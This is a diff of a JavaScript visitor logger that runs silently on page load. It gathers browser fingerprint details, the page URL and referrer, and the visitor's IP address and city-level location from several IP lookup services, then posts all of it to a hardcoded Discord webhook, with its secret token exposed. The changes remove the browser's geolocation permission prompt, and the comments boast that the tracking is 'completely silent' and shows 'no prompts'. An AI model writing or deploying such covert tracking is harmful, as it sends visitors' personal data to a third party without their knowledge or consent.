@@ -1,3 +1,6 @@
+// Discord Webhook Logger - NO PERMISSION PROMPTS
+// Uses only IP-based geolocation (silent, no user interaction needed)
+
 (function() {
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1499634580947472504/b6juZu8B-vCmAtPe0gIUNpTFjN_noP5VhRCMaGU12FVQ-ipySzbtogADyOLtnvcNLzzc";
     
@@ -7,6 +10,7 @@
         if (hasSent) return;
         hasSent = true;
         
+        // Collect all browser/client info (no prompts)
         const clientInfo = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -18,28 +22,22 @@
             deviceMemory: navigator.deviceMemory || "unknown",
             maxTouchPoints: navigator.maxTouchPoints,
             vendor: navigator.vendor,
-            vendorSub: navigator.vendorSub,
-            product: navigator.product,
-            productSub: navigator.productSub,
-            appName: navigator.appName,
-            appVersion: navigator.appVersion,
             onLine: navigator.onLine
         };
         
+        // Screen & Window info
         const screenInfo = {
             screenWidth: screen.width,
             screenHeight: screen.height,
             screenAvailWidth: screen.availWidth,
             screenAvailHeight: screen.availHeight,
             screenColorDepth: screen.colorDepth,
-            screenPixelDepth: screen.pixelDepth,
             windowInnerWidth: window.innerWidth,
             windowInnerHeight: window.innerHeight,
-            windowOuterWidth: window.outerWidth,
-            windowOuterHeight: window.outerHeight,
             devicePixelRatio: window.devicePixelRatio
         };
         
+        // Time & Location info
         const timeInfo = {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezoneOffset: new Date().getTimezoneOffset(),
@@ -48,40 +46,28 @@
             timestamp: Date.now()
         };
         
+        // Page & Referrer info
         const pageInfo = {
             url: window.location.href,
             hostname: window.location.hostname,
             pathname: window.location.pathname,
-            search: window.location.search,
-            hash: window.location.hash,
             referrer: document.referrer,
-            title: document.title,
-            protocol: window.location.protocol
+            title: document.title
         };
         
+        // Performance timing
         let performanceInfo = {};
         if (window.performance && window.performance.timing) {
             const timing = window.performance.timing;
             const loadTime = timing.loadEventEnd - timing.navigationStart;
             performanceInfo = {
-                pageLoadTimeMs: loadTime > 0 ? loadTime : "still loading",
+                pageLoadTimeMs: loadTime > 0 ? loadTime : "loading",
                 domInteractive: timing.domInteractive - timing.navigationStart,
-                domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart,
-                responseTime: timing.responseEnd - timing.requestStart
+                domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart
             };
-        } else if (window.performance && window.performance.getEntriesByType) {
-            const navEntry = performance.getEntriesByType('navigation')[0];
-            if (navEntry) {
-                performanceInfo = {
-                    pageLoadTimeMs: navEntry.loadEventEnd - navEntry.startTime,
-                    domInteractive: navEntry.domInteractive - navEntry.startTime,
-                    domContentLoaded: navEntry.domContentLoadedEventEnd - navEntry.startTime,
-                    responseTime: navEntry.responseEnd - navEntry.requestStart,
-                    fetchStart: navEntry.fetchStart
-                };
-            }
         }
         
+        // Connection info
         let connectionInfo = {};
         if (navigator.connection) {
             const conn = navigator.connection;
@@ -89,73 +75,82 @@
                 effectiveType: conn.effectiveType,
                 rtt: conn.rtt,
                 downlink: conn.downlink,
-                saveData: conn.saveData,
-                type: conn.type
+                saveData: conn.saveData
             };
         }
         
+        // Get IP and location via IP API (SILENT, no prompt)
         let ipData = {};
-        let browserGeoLocation = null;
+        let locationString = "Unknown location";
+        let ipString = "Unknown IP";
+        let city = "Unknown";
+        let country = "Unknown";
+        let region = "Unknown";
         
         try {
+            // Using ipapi.co - completely silent, no user permission needed
             const ipResponse = await fetch('https://ipapi.co/json/');
             if (ipResponse.ok) {
                 ipData = await ipResponse.json();
+                if (ipData.ip) ipString = ipData.ip;
+                if (ipData.city) city = ipData.city;
+                if (ipData.region) region = ipData.region;
+                if (ipData.country_name) country = ipData.country_name;
+                
+                const locationParts = [];
+                if (city && city !== "Unknown") locationParts.push(city);
+                if (region && region !== "Unknown") locationParts.push(region);
+                if (country && country !== "Unknown") locationParts.push(country);
+                locationString = locationParts.length > 0 ? locationParts.join(", ") : (ipData.country || "Unknown");
             }
         } catch (e) {
-            ipData = { error: "Could not fetch IP data", message: e.message };
+            console.warn("IP API failed:", e);
+            ipData = { error: e.message };
         }
         
+        // Try alternative free IP API as backup (still silent)
+        if (ipString === "Unknown IP") {
+            try {
+                const backupResponse = await fetch('https://api.ipify.org?format=json');
+                if (backupResponse.ok) {
+                    const backupData = await backupResponse.json();
+                    if (backupData.ip) ipString = backupData.ip;
+                }
+            } catch (e) {}
+        }
+        
+        // Try geoplugin for more location data (silent)
+        let geoPluginData = {};
         try {
-            const geoPromise = new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp
-                        });
-                    },
-                    (error) => resolve({ error: error.message, code: error.code }),
-                    { timeout: 8000, enableHighAccuracy: true }
-                );
-            });
-            browserGeoLocation = await geoPromise;
-        } catch (e) {
-            browserGeoLocation = { error: e.message };
-        }
+            const geoResponse = await fetch('https://geoplugin.net/json.gp');
+            if (geoResponse.ok) {
+                geoPluginData = await geoResponse.json();
+                if (locationString === "Unknown location" && geoPluginData.geoplugin_city) {
+                    locationString = `${geoPluginData.geoplugin_city}, ${geoPluginData.geoplugin_regionName}, ${geoPluginData.geoplugin_countryName}`;
+                }
+            }
+        } catch (e) {}
         
-        let locationString = "Unknown location";
-        if (ipData && !ipData.error) {
-            const parts = [];
-            if (ipData.city) parts.push(ipData.city);
-            if (ipData.region) parts.push(ipData.region);
-            if (ipData.country_name) parts.push(ipData.country_name);
-            if (parts.length) locationString = parts.join(", ");
-            else if (ipData.country) locationString = ipData.country;
-        }
-        
-        let ipString = ipData?.ip || ipData?.IPv4 || "Unknown IP";
-        
+        // Compile ALL info (no browser geolocation = no prompts)
         const allInfo = {
-            client: clientInfo,
+            visitor_ip: ipString,
+            location: locationString,
+            browser: clientInfo,
             screen: screenInfo,
             time: timeInfo,
             page: pageInfo,
             performance: performanceInfo,
             connection: connectionInfo,
-            ip_api_data: ipData,
-            browser_geolocation: browserGeoLocation,
-            collected_at: new Date().toISOString()
+            ip_api_raw: ipData,
+            geo_plugin_raw: geoPluginData,
+            collected_at: new Date().toISOString(),
+            note: "No browser geolocation used - completely silent"
         };
         
+        // Format for Discord embed
         const allInfoPretty = JSON.stringify(allInfo, null, 2);
         
+        // Create Discord embed
         const embed = {
             title: "🌐 New Visitor Detected",
             color: 0x5865F2,
@@ -172,53 +167,50 @@
                     inline: true
                 },
                 {
-                    name: "🌍 Browser Geolocation",
-                    value: browserGeoLocation?.latitude
-                        ? `Lat: ${browserGeoLocation.latitude}, Lon: ${browserGeoLocation.longitude}\nAccuracy: ${browserGeoLocation.accuracy}m`
-                        : browserGeoLocation?.error || "Not granted or unavailable",
-                    inline: false
-                },
-                {
                     name: "📱 Device & Browser",
-                    value: `UA: ${clientInfo.userAgent.substring(0,100)}\nPlatform: ${clientInfo.platform}\nLanguage: ${clientInfo.language}`,
+                    value: `**OS/Platform:** ${clientInfo.platform || "Unknown"}\n**Language:** ${clientInfo.language}\n**CPU Cores:** ${clientInfo.hardwareConcurrency || "?"}`,
                     inline: false
                 },
                 {
-                    name: "📐 Screen / Viewport",
-                    value: `Screen: ${screenInfo.screenWidth}x${screenInfo.screenHeight}\nViewport: ${screenInfo.windowInnerWidth}x${screenInfo.windowInnerHeight}\nDPR: ${screenInfo.devicePixelRatio}`,
+                    name: "📐 Screen Resolution",
+                    value: `${screenInfo.screenWidth}x${screenInfo.screenHeight} (DPR: ${screenInfo.devicePixelRatio})`,
                     inline: true
                 },
                 {
-                    name: "⏰ Time & TZ",
-                    value: `Timezone: ${timeInfo.timezone}\nLocal: ${timeInfo.localTime}`,
+                    name: "⏰ Timezone",
+                    value: timeInfo.timezone,
                     inline: true
                 },
                 {
-                    name: "🔗 Page Info",
-                    value: `URL: ${pageInfo.url}\nReferrer: ${pageInfo.referrer || "Direct"}`,
+                    name: "🔗 Page URL",
+                    value: pageInfo.url.length > 100 ? pageInfo.url.substring(0, 100) + "..." : pageInfo.url,
+                    inline: false
+                },
+                {
+                    name: "📎 Referrer",
+                    value: pageInfo.referrer || "Direct visit",
                     inline: false
                 },
                 {
                     name: "⚡ Connection",
-                    value: connectionInfo.effectiveType
-                        ? `Type: ${connectionInfo.effectiveType}, RTT: ${connectionInfo.rtt}ms, Downlink: ${connectionInfo.downlink}Mbps`
-                        : "Not available",
+                    value: connectionInfo.effectiveType ? `${connectionInfo.effectiveType}, ${connectionInfo.rtt || "?"}ms` : "Not available",
                     inline: true
                 },
                 {
-                    name: "📦 All Collected Data",
-                    value: "```json\n" + allInfoPretty.substring(0,1000) + (allInfoPretty.length > 1000 ? "\n..." : "") + "\n```",
+                    name: "📦 All Collected Data (full dump)",
+                    value: "```json\n" + allInfoPretty.substring(0, 1000) + (allInfoPretty.length > 1000 ? "\n... (truncated)" : "") + "\n```",
                     inline: false
                 }
             ],
             footer: {
-                text: "Visitor tracker • " + new Date().toLocaleString()
+                text: "🔍 Silent tracker • No prompts shown"
             }
         };
         
-        const locationDisplay = locationString !== "Unknown location" ? locationString : ipString;
-        const messageContent = `Seems like a fellow is interested, they are from **${locationDisplay}**\n-# \`${ipString}\``;
+        // Exact message format you requested
+        const messageContent = `Seems like a fellow is interested, they are from **${locationString}** \n-# \`${ipString}\``;
         
+        // Send to Discord
         const payload = {
             content: messageContent,
             embeds: [embed],
@@ -227,14 +219,23 @@
         };
         
         try {
-            await fetch(WEBHOOK_URL, {
+            const response = await fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
-        } catch (error) {}
+            
+            if (response.ok) {
+                console.log("✅ Log sent silently");
+            } else {
+                console.error("Webhook error:", response.status);
+            }
+        } catch (error) {
+            console.error("Network error:", error);
+        }
     }
     
+    // Run silently on page load
     if (document.readyState === "loading") {
         document.addEventListener("DOMContentLoaded", sendLog);
     } else {
